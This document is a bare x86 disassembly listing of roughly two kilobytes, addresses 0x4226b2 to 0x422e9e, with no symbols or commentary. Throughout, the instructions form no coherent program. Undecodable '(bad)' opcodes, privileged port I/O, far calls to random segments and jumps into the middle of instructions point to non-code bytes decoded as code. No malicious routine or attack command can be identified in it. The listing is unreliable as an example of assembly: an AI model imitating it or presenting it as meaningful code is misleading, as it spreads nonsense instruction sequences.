  4226b2:	or     esp,ebx
  4226b4:	in     eax,0xa9
  4226b6:	outs   dx,DWORD PTR ds:[esi]
  4226b7:	xchg   ebp,eax
  4226b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b9:	cwde   
  4226ba:	popf   
  4226bb:	arpl   cx,bx
  4226bd:	stos   BYTE PTR es:[edi],al
  4226be:	xlat   BYTE PTR ds:[ebx]
  4226bf:	sub    BYTE PTR [eax+0x7d],0x1a
  4226c3:	mov    esi,esp
  4226c5:	arpl   WORD PTR [edi-0x5d],cx
  4226c8:	sub    BYTE PTR [ebx+0x2adbf337],cl
  4226ce:	dec    ebp
  4226cf:	add    DWORD PTR [edi],eax
  4226d1:	mov    DWORD PTR [ebp-0x63],0x98aa8add
  4226d8:	mov    edi,0x7b3c9ea
  4226dd:	mov    eax,0xcde2c844
  4226e2:	jae    0x42269c
  4226e4:	jmp    0x4226df
  4226e6:	fwait
  4226e7:	push   0xffffffd5
  4226e9:	gs aad 0xe0
  4226ec:	dec    ebp
  4226ed:	outs   dx,BYTE PTR ds:[esi]
  4226ee:	jle    0x4226a3
  4226f0:	call   0x2f79:0x2687e63
  4226f7:	adc    eax,0x3181be66
  4226fc:	dec    edi
  4226fd:	pop    esi
  4226fe:	mov    eax,?
  422700:	fwait
  422701:	lds    edx,FWORD PTR [ebp-0x54]
  422704:	pushf  
  422705:	fnsave [ebx-0x5b9192f0]
  42270b:	test   DWORD PTR [ebx-0x10],ecx
  42270e:	loop   0x422701
  422710:	dec    esp
  422711:	sbb    dh,ah
  422713:	mov    dh,0x9e
  422715:	lds    esp,FWORD PTR [esi]
  422717:	outs   dx,BYTE PTR ds:[esi]
  422718:	imul   edi,ecx,0xe1d2443f
  42271e:	fwait
  42271f:	ret    0xe95a
  422722:	add    eax,0xd36d3517
  422727:	or     al,0x7e
  422729:	lock fucomp st(7)
  42272c:	(bad)  
  42272d:	push   eax
  42272e:	hlt    
  42272f:	in     eax,0xf7
  422731:	jl     0x422771
  422733:	dec    ebx
  422734:	mov    ch,0xa2
  422736:	das    
  422737:	inc    ecx
  422738:	ds jb  0x42273d
  42273b:	xor    al,0x63
  42273d:	mov    esp,edi
  42273f:	xchg   DWORD PTR [eax],ebp
  422741:	sub    ecx,DWORD PTR [edi]
  422743:	mov    ds:0x3d5cdff0,eax
  422748:	mov    WORD PTR [esi-0x73],ss
  42274b:	ins    BYTE PTR es:[edi],dx
  42274c:	mov    esi,0xb0ca161d
  422751:	adc    DWORD PTR [eax+0x3],esi
  422754:	inc    ebp
  422755:	mov    dl,0x1d
  422757:	mov    al,ds:0x33ac1af5
  42275c:	js     0x422761
  42275e:	inc    esi
  42275f:	stos   BYTE PTR es:[edi],al
  422760:	cwde   
  422761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422762:	pop    edi
  422763:	scas   eax,DWORD PTR es:[edi]
  422764:	cmp    ah,BYTE PTR [edx]
  422766:	pop    esp
  422767:	arpl   WORD PTR [esp+eax*2],di
  42276a:	pop    DWORD PTR [edx+esi*4+0x7befde7]
  422771:	out    0xc2,eax
  422773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422774:	int3   
  422775:	loop   0x4227b7
  422777:	cdq    
  422778:	push   ebp
  422779:	mov    eax,0x94ef7aa0
  42277e:	loop   0x422721
  422780:	lods   eax,DWORD PTR ds:[esi]
  422781:	test   DWORD PTR [ecx-0x24a2685],ecx
  422787:	in     eax,0xa7
  422789:	pushf  
  42278a:	shr    DWORD PTR [ecx+0x4b],cl
  42278d:	lods   eax,DWORD PTR ds:[esi]
  42278e:	in     al,0x5a
  422790:	mov    ch,0x77
  422792:	out    0x36,al
  422794:	popa   
  422795:	mov    ebx,0x6d789465
  42279a:	nop
  42279b:	nop
  42279c:	push   esi
  42279d:	mov    dh,0x50
  42279f:	xchg   ebp,eax
  4227a0:	retf   0x9f31
  4227a3:	cmp    ch,BYTE PTR [ebx]
  4227a5:	sbb    dh,BYTE PTR [eax+0x34e449c3]
  4227ab:	fistp  WORD PTR [edi]
  4227ad:	push   esp
  4227ae:	and    al,0x11
  4227b0:	pop    ss
  4227b1:	jns    0x4227b3
  4227b3:	jns    0x42275e
  4227b5:	or     al,0xd3
  4227b7:	dec    edx
  4227b8:	mov    esi,DWORD PTR [eax-0x4c]
  4227bb:	mov    BYTE PTR [edx+0xee3ad1d],cl
  4227c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227c2:	ja     0x422780
  4227c4:	mov    ch,0xe5
  4227c6:	pop    ds
  4227c7:	and    edi,edi
  4227c9:	push   ds
  4227ca:	adc    eax,0x7f6e54ea
  4227cf:	adc    dh,BYTE PTR [ecx+ebx*1+0x3adfa7ff]
  4227d6:	or     al,0xcc
  4227d8:	ins    DWORD PTR es:[edi],dx
  4227d9:	mov    ch,0x5b
  4227db:	cmp    DWORD PTR [ecx+edi*8-0x5a592615],0xa76e52aa
  4227e6:	rcl    BYTE PTR [esi],0x4a
  4227e9:	ret    
  4227ea:	mov    dl,0xa7
  4227ec:	adc    al,0x77
  4227ee:	das    
  4227ef:	stos   DWORD PTR es:[edi],eax
  4227f0:	cmp    BYTE PTR [edi+0x4e67521a],0xc0
  4227f7:	scas   al,BYTE PTR es:[edi]
  4227f8:	lods   eax,DWORD PTR ds:[esi]
  4227f9:	mov    bl,0x9a
  4227fb:	inc    eax
  4227fc:	sbb    DWORD PTR [ebp+edi*2-0x3],ebx
  422800:	ins    BYTE PTR es:[edi],dx
  422801:	or     ecx,DWORD PTR [esi]
  422803:	mov    al,0x4d
  422805:	push   ebx
  422806:	repz in eax,0xe1
  422809:	out    dx,eax
  42280a:	cmp    al,BYTE PTR [ebx-0x45]
  42280d:	enter  0x3304,0xa0
  422811:	pop    ebx
  422812:	call   0x6fa8:0x5481fd75
  422819:	mov    ds:0x97f2d726,al
  42281e:	inc    edi
  42281f:	or     al,0xa6
  422821:	cli    
  422822:	or     bh,BYTE PTR [edx]
  422824:	inc    esp
  422825:	or     ebx,DWORD PTR ds:0xaa30354b
  42282b:	lods   eax,DWORD PTR ds:[esi]
  42282c:	xor    al,0xfe
  42282e:	cmp    al,0x7d
  422830:	or     eax,0xb430c285
  422835:	pop    esi
  422836:	ds out dx,al
  422838:	idiv   BYTE PTR [ecx+0x4]
  42283b:	jp     0x4228b1
  42283d:	xchg   BYTE PTR [eax+0x7c],dh
  422840:	sahf   
  422841:	mov    ebx,0x9b8a63f8
  422846:	sbb    dl,BYTE PTR [edi]
  422848:	add    ah,BYTE PTR [edx-0x3e]
  42284b:	inc    BYTE PTR [eax-0x2a52cd82]
  422851:	mov    esi,0xdbde491
  422856:	jmp    0x9572:0x332fcacf
  42285d:	(bad)  
  42285f:	repz add eax,0x464642b6
  422865:	jb     0x422856
  422867:	or     DWORD PTR [edi+0x4e],ecx
  42286a:	push   edx
  42286b:	mov    bh,BYTE PTR [esi+0x4aa91e00]
  422871:	dec    ebx
  422872:	ins    BYTE PTR es:[edi],dx
  422873:	mov    bl,0x40
  422875:	cmp    bl,BYTE PTR [ebx]
  422877:	dec    eax
  422878:	xor    eax,0x8ade22a0
  42287d:	rcl    ebp,0x13
  422880:	aaa    
  422881:	and    al,0xd5
  422883:	inc    eax
  422884:	sbb    ebp,DWORD PTR [edi-0x29]
  422887:	mov    al,0x44
  422889:	(bad)  
  42288b:	dec    esi
  42288c:	and    cl,BYTE PTR [edi*8+0x74b5af4a]
  422893:	pop    ebp
  422894:	or     al,0x11
  422896:	push   edx
  422897:	aas    
  422898:	ss jmp 0x2257513d
  42289e:	mov    eax,ebp
  4228a0:	call   0x91b4331e
  4228a5:	or     esp,DWORD PTR [eax+0x14]
  4228a8:	pop    ds
  4228a9:	and    ah,0xd0
  4228ac:	cmp    BYTE PTR [ebx+0x27066db1],al
  4228b2:	push   0x75
  4228b4:	adc    DWORD PTR [edi],esp
  4228b6:	dec    ebp
  4228b7:	lahf   
  4228b8:	sbb    al,0xeb
  4228ba:	cdq    
  4228bb:	gs addr16 mov ch,0x4e
  4228bf:	retf   0x4f89
  4228c2:	(bad)  
  4228c3:	xrelease mov DWORD PTR [esi+eiz*4],edi
  4228c7:	mov    ds:0x4dee160c,al
  4228cc:	loopne 0x42286c
  4228ce:	jne    0x422934
  4228d0:	jmp    0xba245894
  4228d5:	sub    dl,BYTE PTR [edx]
  4228d7:	leave  
  4228d8:	jne    0x422950
  4228da:	add    edi,DWORD PTR [ecx-0x5a]
  4228dd:	push   ecx
  4228de:	xlat   BYTE PTR ds:[ebx]
  4228df:	sub    al,0x48
  4228e1:	adc    dl,al
  4228e3:	mov    esp,0xa19a096
  4228e8:	or     BYTE PTR [esi],0x9a
  4228eb:	into   
  4228ec:	out    dx,al
  4228ed:	sub    eax,0xe3a026e
  4228f2:	mov    ch,0x40
  4228f4:	aaa    
  4228f5:	mov    cs,WORD PTR [ecx+eiz*4-0x46ced538]
  4228fc:	push   0xa29e4d8a
  422901:	outs   dx,DWORD PTR ds:[esi]
  422902:	dec    esi
  422903:	(bad)
  422907:	adc    ch,BYTE PTR [esi-0x4849aaaa]
  42290d:	or     DWORD PTR [ecx+0x4f10d61d],ebp
  422913:	mov    ebx,0x3eff3c90
  422918:	xor    ebx,DWORD PTR [edi+0x41]
  42291b:	inc    esi
  42291c:	dec    edi
  42291d:	test   al,0xd8
  42291f:	and    BYTE PTR [edi],cl
  422921:	pop    ebp
  422922:	stos   BYTE PTR es:[edi],al
  422923:	inc    ebx
  422925:	(bad)  
  422926:	sbb    al,dh
  422928:	cmc    
  422929:	data16 ins BYTE PTR es:[edi],dx
  42292b:	add    BYTE PTR [esi],0x2b
  42292e:	aam    0x8e
  422930:	sete   bh
  422933:	jns    0x4228ba
  422935:	cmp    eax,0xc84958e4
  42293a:	dec    DWORD PTR [edi]
  42293c:	lds    esp,FWORD PTR [edx-0x71]
  42293f:	push   esp
  422940:	inc    edi
  422941:	push   ebx
  422942:	jmp    0x422918
  422944:	xor    eax,0x19c03902
  422949:	adc    bl,BYTE PTR [edx-0x58683cb9]
  42294f:	pop    esi
  422950:	xchg   edi,eax
  422951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422952:	lds    esp,FWORD PTR [eax-0x6976c021]
  422958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422959:	mov    fs,WORD PTR ds:0x690b2c81
  42295f:	or     al,0x59
  422961:	fsub   DWORD PTR [eax]
  422963:	add    edi,0x5b334800
  422969:	sar    esi,0xfe
  42296c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42296d:	and    DWORD PTR [edx+0x190157d7],ebp
  422973:	add    BYTE PTR [edx+0x454cf3c4],ah
  422979:	mov    bh,0x73
  42297b:	inc    ebp
  42297c:	pop    ebx
  42297d:	sbb    bl,BYTE PTR [esp+eax*4+0x51a098ea]
  422984:	xor    eax,ebx
  422986:	jb     0x422961
  422988:	mov    al,0x49
  42298a:	jmp    0x978d3b8c
  42298f:	xchg   ebp,eax
  422990:	jecxz  0x422946
  422992:	xchg   ebx,eax
  422993:	cld    
  422994:	sti    
  422995:	mov    edi,0x4022cc39
  42299a:	dec    esp
  42299b:	pop    ebp
  42299c:	fdivr  st(1),st
  42299e:	mov    ebp,0x217d254f
  4229a3:	sub    al,0x52
  4229a5:	adc    esi,ecx
  4229a7:	out    dx,eax
  4229a8:	ds fwait
  4229aa:	adc    DWORD PTR [eax-0x7e],ecx
  4229ad:	fnstcw WORD PTR [ebp-0x1f15c370]
  4229b3:	mov    ds:0x622ae217,eax
  4229b8:	call   0xe98e:0xb8759723
  4229bf:	jno    0x422965
  4229c1:	data16 int 0x2
  4229c4:	dec    ebx
  4229c5:	fdivr  st(4),st
  4229c7:	ret    0xdc98
  4229ca:	iret   
  4229cb:	rcr    ebp,0x73
  4229ce:	or     DWORD PTR [esi],eax
  4229d0:	popf   
  4229d1:	mov    ds:0x15e7e2e0,al
  4229d6:	(bad)  
  4229d7:	imul   ebx,edi,0xcbda690
  4229dd:	loopne 0x4229c6
  4229df:	sbb    eax,0xecfdaddc
  4229e4:	ss std 
  4229e6:	ins    BYTE PTR es:[edi],dx
  4229e7:	shr    ebx,0x64
  4229ea:	ja     0x4229e1
  4229ec:	retf   0x8dd1
  4229ef:	or     BYTE PTR [edx],bl
  4229f1:	or     eax,0x10e741ea
  4229f6:	cli    
  4229f7:	push   0x9139e2ae
  4229fc:	jno    0x422a2e
  4229fe:	cwde   
  4229ff:	mov    al,ds:0xacec57f4
  422a04:	xchg   esp,eax
  422a05:	pushf  
  422a06:	mov    ebp,0xe753642f
  422a0b:	sar    DWORD PTR [ecx-0x74444073],1
  422a11:	aam    0xcd
  422a13:	imul   ebp,esi,0x7c
  422a16:	jns    0x422a78
  422a18:	pop    ebp
  422a19:	mov    cl,0xb8
  422a1b:	inc    esp
  422a1c:	mov    ecx,DWORD PTR [esi+0x17277569]
  422a22:	mov    dl,BYTE PTR [edi-0x3d]
  422a25:	ret    
  422a26:	cld    
  422a27:	sar    BYTE PTR [eax],1
  422a29:	mov    edi,0xa3905bc0
  422a2e:	daa    
  422a2f:	ins    DWORD PTR es:[edi],dx
  422a30:	push   esp
  422a31:	ret    
  422a32:	xor    DWORD PTR [edx+0xf615617],edx
  422a38:	neg    BYTE PTR [edx+0x42]
  422a3b:	les    ebp,FWORD PTR [eax+ebp*8]
  422a3e:	pop    ebp
  422a3f:	xchg   esp,eax
  422a40:	lahf   
  422a41:	pop    ebp
  422a42:	(bad)  
  422a43:	(bad)  
  422a44:	jg     0x422a1a
  422a46:	pop    DWORD PTR [edx+esi*1-0x65ebe665]
  422a4d:	leave  
  422a4e:	loop   0x422a36
  422a50:	addr16 xor dl,al
  422a53:	retf   
  422a54:	mov    al,ds:0xfd14d7cb
  422a59:	int3   
  422a5a:	loope  0x422a0b
  422a5c:	pop    ss
  422a5d:	out    0x15,eax
  422a5f:	mov    cs,WORD PTR [edx]
  422a61:	loop   0x422a7e
  422a63:	push   esi
  422a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a65:	add    edi,ebx
  422a67:	xchg   esi,eax
  422a68:	retf   
  422a69:	or     al,0x4d
  422a6b:	push   cs
  422a6c:	cmp    dl,dh
  422a6e:	mov    eax,DWORD PTR [ebp+0x23]
  422a71:	pop    ebx
  422a72:	(bad)  
  422a74:	and    eax,DWORD PTR [esp+edx*1+0x1399eb81]
  422a7b:	iret   
  422a7c:	stc    
  422a7d:	and    ecx,esp
  422a7f:	popa   
  422a80:	or     al,BYTE PTR [edi]
  422a82:	mov    eax,0x86ef61ae
  422a87:	mov    ebp,0x7a6aac5b
  422a8c:	gs pop esp
  422a8e:	mov    esi,0xcc782ba2
  422a93:	sbb    DWORD PTR [ebx+0x74fa10c],ebp
  422a99:	jl     0x422a24
  422a9b:	sub    BYTE PTR ds:0x5de559c3,cl
  422aa1:	mov    al,ds:0xcedce5ee
  422aa6:	inc    ebp
  422aa7:	cmc    
  422aa8:	jge    0x422a5c
  422aaa:	les    ebx,FWORD PTR [edx+0xdd22018]
  422ab0:	lock in al,0xcd
  422ab3:	sbb    al,0x89
  422ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ab6:	and    cl,BYTE PTR [eax-0x1d]
  422ab9:	mov    edx,0x253e44bd
  422abe:	pop    esi
  422abf:	xchg   ebx,eax
  422ac0:	frstor [edi]
  422ac2:	or     ecx,DWORD PTR [ebx-0x6b]
  422ac5:	js     0x422b2b
  422ac7:	mov    esi,0x2d65d8e5
  422acc:	mov    cl,0x15
  422ace:	inc    ecx
  422acf:	rol    bh,0x48
  422ad2:	in     al,0x21
  422ad4:	mov    dh,0x51
  422ad6:	adc    al,0x68
  422ad8:	xchg   ecx,ecx
  422ada:	sbb    al,0x1c
  422adc:	lods   al,BYTE PTR ds:[esi]
  422add:	sbb    DWORD PTR [eax+0x34bab4f5],0xffffff92
  422ae4:	(bad)  
  422ae5:	repz cmp BYTE PTR [ebx-0xef12760],bh
  422aec:	push   eax
  422aed:	pop    ebp
  422aee:	cmc    
  422aef:	mov    BYTE PTR [eax+ecx*1+0x68],al
  422af3:	inc    edi
  422af4:	shl    DWORD PTR [edi+0x580b6226],cl
  422afa:	test   al,0xa1
  422afc:	pop    esp
  422afd:	xor    bh,BYTE PTR [esi*8-0x3ba837c8]
  422b04:	push   es
  422b05:	sbb    ebx,DWORD PTR [ebx+0x3c86e486]
  422b0b:	loop   0x422b7b
  422b0d:	mov    ah,0x37
  422b0f:	mov    bl,0x31
  422b11:	or     esp,DWORD PTR [ebx+0x4]
  422b14:	adc    eax,0x6521eb98
  422b19:	loop   0x422b55
  422b1b:	cmp    DWORD PTR [ebp+edx*8-0x2d8ce67d],0xffffffd8
  422b23:	push   0xffffffb5
  422b25:	cmp    al,0xa7
  422b27:	popa   
  422b28:	les    ebp,FWORD PTR [eax+0x39]
  422b2b:	and    al,BYTE PTR [edi+0x37]
  422b2e:	ss ds daa 
  422b31:	add    al,0xf2
  422b33:	xlat   BYTE PTR ds:[ebx]
  422b34:	ret    0xacb4
  422b37:	aas    
  422b38:	outs   dx,DWORD PTR ds:[esi]
  422b39:	or     al,bh
  422b3b:	mov    edi,0xa0b60f9f
  422b40:	sahf   
  422b41:	add    ah,cl
  422b43:	xchg   ebx,eax
  422b44:	dec    esp
  422b45:	jbe    0x422b0a
  422b47:	mov    DWORD PTR [esi+0x3160542b],0x81ecf0ea
  422b51:	fidiv  WORD PTR [esi-0x23576c92]
  422b57:	call   0x877c:0xb1eb963d
  422b5e:	xchg   edi,eax
  422b5f:	adc    ebp,esi
  422b61:	pop    ss
  422b62:	cmp    eax,0x115fd7ad
  422b67:	mov    dh,0x47
  422b69:	in     al,0x80
  422b6b:	mov    bh,0x3a
  422b6d:	inc    esp
  422b6e:	mov    edi,0xc1745ad1
  422b73:	out    0x3d,eax
  422b75:	les    ebp,FWORD PTR [ecx]
  422b77:	ja     0x422bf4
  422b79:	cmp    al,0x1f
  422b7b:	sub    edi,DWORD PTR [ebx]
  422b7d:	cmp    eax,DWORD PTR [edi]
  422b7f:	xchg   ebp,eax
  422b80:	mov    edi,0xfc9da97
  422b85:	push   ebx
  422b86:	bound  esi,QWORD PTR [eax+0x54efbb52]
  422b8c:	cli    
  422b8d:	aaa    
  422b8e:	pop    ecx
  422b8f:	jg     0x422b40
  422b91:	lock out 0xd6,eax
  422b94:	and    bh,al
  422b96:	out    0x5,eax
  422b98:	mov    cl,0x40
  422b9a:	std    
  422b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b9c:	pop    es
  422b9d:	mov    BYTE PTR [ecx],dh
  422b9f:	std    
  422ba0:	fidivr DWORD PTR ds:0xe8505c51
  422ba6:	test   BYTE PTR [esi+0x4e],0xce
  422baa:	mov    cl,0xf2
  422bac:	repnz or DWORD PTR [ecx+0x56b7c866],0x93d371ca
  422bb7:	idiv   BYTE PTR [edx+0x4f]
  422bba:	test   BYTE PTR [ecx-0x68],ch
  422bbd:	or     eax,0xd6ed6cc4
  422bc2:	into   
  422bc3:	pop    edi
  422bc4:	stos   DWORD PTR es:[edi],eax
  422bc5:	fdivp  st(3),st
  422bc7:	sti    
  422bc8:	and    esi,DWORD PTR [eax-0x64]
  422bcb:	into   
  422bcc:	xchg   ax,ax
  422bce:	call   0xb79979ef
  422bd3:	mov    ds:0x891b480f,al
  422bd8:	push   ecx
  422bd9:	jecxz  0x422b8e
  422bdb:	sub    bl,BYTE PTR [ebx]
  422bdd:	lahf   
  422bde:	div    BYTE PTR [eax+0x23b37a95]
  422be4:	push   0x7f
  422be6:	int    0x11
  422be8:	jae    0x422c2f
  422bea:	inc    ebp
  422beb:	enter  0x35c5,0x8c
  422bef:	mov    edi,DWORD PTR ds:0xddf536d6
  422bf5:	enter  0x209e,0x84
  422bf9:	(bad)  
  422bfa:	lods   al,BYTE PTR ds:[esi]
  422bfb:	aas    
  422bfc:	cdq    
  422bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bfe:	mov    edi,0x5a85c70
  422c03:	mov    cl,0x57
  422c05:	in     al,dx
  422c06:	sti    
  422c07:	xchg   edi,eax
  422c08:	sub    BYTE PTR [edx-0x50d24328],al
  422c0e:	jmp    0xd4b:0xdf556563
  422c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c16:	and    al,0x2e
  422c18:	mov    dl,0xd9
  422c1a:	mov    esi,DWORD PTR [edi]
  422c1c:	inc    ecx
  422c1d:	add    eax,0x7e9eb4f2
  422c22:	jne    0x422c55
  422c24:	add    al,0xee
  422c26:	pop    ebp
  422c27:	(bad)  
  422c28:	loop   0x422ca2
  422c2a:	adc    ebp,DWORD PTR [esi]
  422c2c:	inc    edx
  422c2d:	stos   DWORD PTR es:[edi],eax
  422c2e:	imul   DWORD PTR [ecx-0x3dc929b0]
  422c34:	mov    DWORD PTR [ebx+0x58],edi
  422c37:	test   al,0x33
  422c39:	or     BYTE PTR [ebx],bh
  422c3b:	sbb    eax,0x2596eb0c
  422c40:	std    
  422c41:	and    edx,esp
  422c43:	addr16 gs inc edx
  422c46:	lods   al,BYTE PTR ds:[esi]
  422c47:	in     eax,dx
  422c48:	in     al,0x9a
  422c4a:	das    
  422c4b:	daa    
  422c4c:	fnstcw WORD PTR [esi]
  422c4e:	fidiv  WORD PTR [ebx+0x418991c7]
  422c54:	cmp    al,0x40
  422c56:	adc    eax,0xea4ff6b
  422c5b:	sbb    al,0x7e
  422c5d:	cwde   
  422c5e:	xor    BYTE PTR [esi+0x41315071],0x7c
  422c65:	and    ecx,DWORD PTR ds:0xcca8e788
  422c6b:	in     eax,0x9f
  422c6d:	ins    BYTE PTR es:[edi],dx
  422c6e:	out    dx,al
  422c6f:	mov    esp,0x523684db
  422c74:	(bad)  
  422c75:	and    BYTE PTR [esi-0x77355de9],ah
  422c7b:	and    eax,0xdb8259a4
  422c80:	loope  0x422cd0
  422c82:	push   edx
  422c83:	nop
  422c84:	sti    
  422c85:	sub    DWORD PTR [ebp-0x6b],0xee2d3e97
  422c8c:	inc    eax
  422c8d:	sub    eax,edx
  422c8f:	(bad)  
  422c90:	push   ebx
  422c91:	imul   ebp,DWORD PTR [ebx+0x1678e78a],0x53ca2b77
  422c9b:	(bad)  
  422c9c:	lock sbb al,0x2e
  422c9f:	stos   BYTE PTR es:[edi],al
  422ca0:	cmp    dh,dh
  422ca2:	fbld   TBYTE PTR [edx-0x1f96e8b2]
  422ca8:	or     al,BYTE PTR [edi-0x76d63327]
  422cae:	push   ecx
  422caf:	adc    al,BYTE PTR [edi]
  422cb1:	or     DWORD PTR [ebx-0x4a905145],0xbb7b4269
  422cbb:	jbe    0x422d07
  422cbd:	pop    edx
  422cbe:	test   eax,ebp
  422cc0:	mov    dl,0x9
  422cc2:	call   0xcd14cb13
  422cc7:	std    
  422cc8:	enter  0x7a66,0x1
  422ccc:	sbb    al,dh
  422cce:	int3   
  422ccf:	movups xmm6,XMMWORD PTR [eax-0x13]
  422cd3:	ja     0x422c8d
  422cd5:	addr16 jmp 0xa5d3d51e
  422cdb:	push   ds
  422cdc:	mov    esi,0xc709a21a
  422ce1:	jns    0x422cda
  422ce3:	sbb    eax,0x5d277519
  422ce8:	fwait
  422ce9:	or     ch,BYTE PTR [ecx-0x63c6bd32]
  422cef:	push   es
  422cf0:	out    dx,al
  422cf1:	pop    edx
  422cf2:	mov    ebx,0x81da959c
  422cf7:	push   edx
  422cf8:	inc    ebp
  422cf9:	ss pushf 
  422cfb:	and    dh,bh
  422cfd:	and    eax,0xd3923e56
  422d02:	or     esp,DWORD PTR [ebp+0x7f08f6c1]
  422d08:	in     al,dx
  422d09:	push   esp
  422d0a:	inc    BYTE PTR [edi]
  422d0c:	cwde   
  422d0d:	xchg   edx,eax
  422d0e:	cmp    eax,0xbc08a2d0
  422d13:	jmp    0x422d45
  422d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d16:	push   0x28
  422d18:	add    dl,BYTE PTR [eax-0x5398d21e]
  422d1e:	mov    BYTE PTR [edx+0x491026c4],bh
  422d24:	and    al,BYTE PTR [edi]
  422d26:	add    cl,al
  422d28:	mov    dl,0x53
  422d2a:	push   ebx
  422d2b:	add    esi,eax
  422d2d:	sbb    dh,dl
  422d2f:	mov    ecx,0x4348cfda
  422d34:	sbb    ebx,DWORD PTR [edi]
  422d36:	shl    DWORD PTR [eax+eiz*2-0x58],1
  422d3a:	mov    eax,0x945c65b5
  422d3f:	rcl    edx,0xfa
  422d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d43:	xor    al,0x8e
  422d45:	stos   DWORD PTR es:[edi],eax
  422d46:	in     eax,dx
  422d47:	mov    dh,0x58
  422d49:	dec    eax
  422d4a:	sub    eax,0x9cafa26a
  422d4f:	jecxz  0x422d83
  422d51:	addr16 addr16 jbe 0x422dce
  422d55:	inc    ebp
  422d56:	and    BYTE PTR [esi],bh
  422d58:	ins    DWORD PTR es:[edi],dx
  422d59:	jp     0x422cee
  422d5b:	(bad)  
  422d5c:	mov    edi,DWORD PTR [eax-0x46]
  422d5f:	sbb    ecx,esp
  422d61:	out    dx,al
  422d62:	mov    al,0x85
  422d64:	xchg   BYTE PTR [ebx+esi*2-0xdc73313],ah
  422d6b:	cmp    al,0x5c
  422d6d:	dec    esp
  422d6e:	xchg   DWORD PTR [esp+edi*8],ebx
  422d71:	fst    QWORD PTR [eax+0x5a50415c]
  422d77:	bound  esi,QWORD PTR [edi]
  422d79:	lahf   
  422d7a:	pop    esi
  422d7b:	(bad)  
  422d7c:	out    dx,al
  422d7d:	sbb    eax,0x8ca2176f
  422d82:	or     eax,0x60accea2
  422d87:	mov    al,ds:0x1a97ed66
  422d8c:	call   0x70f1:0xbff4b7c8
  422d93:	test   eax,0x164af4be
  422d98:	rcr    DWORD PTR [edx],0x40
  422d9b:	mov    ds:0xfefbad8e,al
  422da0:	call   0xf7942611
  422da5:	xchg   ebp,eax
  422da6:	xor    BYTE PTR [edi],ch
  422da8:	cmp    ecx,DWORD PTR [edi*4-0x49878e17]
  422daf:	das    
  422db0:	imul   ecx,DWORD PTR [eax-0x5ac66d2a],0xd7f3a2ae
  422dba:	adc    al,0xe8
  422dbc:	mov    edi,DWORD PTR [esi]
  422dbe:	cmp    eax,0x5e9cafe4
  422dc3:	cmp    DWORD PTR [ecx],ebx
  422dc5:	nop
  422dc6:	dec    esp
  422dc7:	pushf  
  422dc8:	cmp    DWORD PTR [ebx+0x12],ecx
  422dcb:	sbb    eax,DWORD PTR [esi+0x4d]
  422dce:	dec    esi
  422dcf:	(bad)  
  422dd1:	lds    ecx,FWORD PTR [ecx]
  422dd3:	je     0x422ded
  422dd5:	test   al,0xd
  422dd7:	test   al,0xcf
  422dd9:	lahf   
  422dda:	xor    BYTE PTR [edx-0x10],al
  422ddd:	scas   eax,DWORD PTR es:[edi]
  422dde:	test   DWORD PTR [edi+0x864c1b8],edi
  422de4:	push   es
  422de5:	test   eax,0xe31d4074
  422dea:	push   ss
  422deb:	push   edi
  422dec:	outs   dx,DWORD PTR ds:[esi]
  422ded:	or     BYTE PTR [esi],cl
  422def:	lea    ecx,ds:0xee2e13b2
  422df5:	or     DWORD PTR [eax-0x37],ebx
  422df8:	mov    ah,al
  422dfa:	aad    0x39
  422dfc:	fsubr  st,st(2)
  422dfe:	pop    ecx
  422dff:	cdq    
  422e00:	jae    0x422e38
  422e02:	iret   
  422e03:	gs in  eax,0x12
  422e06:	jle    0x422dac
  422e08:	lahf   
  422e09:	inc    eax
  422e0a:	sbb    ebp,ebp
  422e0c:	add    ecx,DWORD PTR [ebp+0x46a43f65]
  422e12:	lahf   
  422e13:	stos   DWORD PTR es:[edi],eax
  422e14:	dec    edx
  422e15:	adc    cl,BYTE PTR [edi+0x1172210f]
  422e1b:	or     eax,0x77e5d138
  422e20:	xchg   edi,eax
  422e21:	(bad)  
  422e22:	mov    esp,0xb92e124a
  422e27:	stos   DWORD PTR es:[edi],eax
  422e28:	mov    ebx,0xa2e6895d
  422e2d:	and    bl,BYTE PTR [edi+0x2a]
  422e30:	xchg   ebp,esi
  422e32:	mov    ch,0xb4
  422e34:	xchg   BYTE PTR [ebx-0x71],bl
  422e37:	leave  
  422e38:	mov    eax,es:0x945c10af
  422e3e:	fldcw  WORD PTR [ebx-0x54d030f0]
  422e44:	imul   eax,DWORD PTR [esi+esi*4+0x67],0x94146e1f
  422e4c:	pop    es
  422e4d:	and    eax,0x42671a69
  422e52:	std    
  422e53:	sti    
  422e54:	ret    0x5c08
  422e57:	mov    BYTE PTR [eax],al
  422e59:	repnz mov esp,DWORD PTR [ebx+0x5c]
  422e5d:	lods   eax,DWORD PTR es:[esi]
  422e5f:	xor    BYTE PTR [ebx+esi*8],bl
  422e62:	and    dh,BYTE PTR [eax-0x5de9fa1b]
  422e68:	jp     0x422ebe
  422e6a:	xchg   ecx,eax
  422e6b:	jae    0x422e27
  422e6d:	fisubr DWORD PTR [edx+0x13]
  422e70:	pop    ds
  422e71:	test   DWORD PTR [ebp-0xc2ee8e9],ebp
  422e77:	push   eax
  422e78:	mov    edx,0xbb9f1545
  422e7d:	dec    eax
  422e7e:	cmp    DWORD PTR [edi-0x73],esp
  422e81:	pop    edx
  422e82:	push   0xffffffaf
  422e84:	es icebp 
  422e86:	test   BYTE PTR [edx-0x1ad9a671],bl
  422e8c:	xor    eax,0x77d6daf9
  422e91:	and    eax,0x457c2a28
  422e96:	mov    bh,0xb3
  422e98:	pop    ebp
  422e99:	(bad)  
  422e9a:	jnp    0x422e50
  422e9c:	push   edi
  422e9d:	dec    ebp
  422e9e:	pop    esi
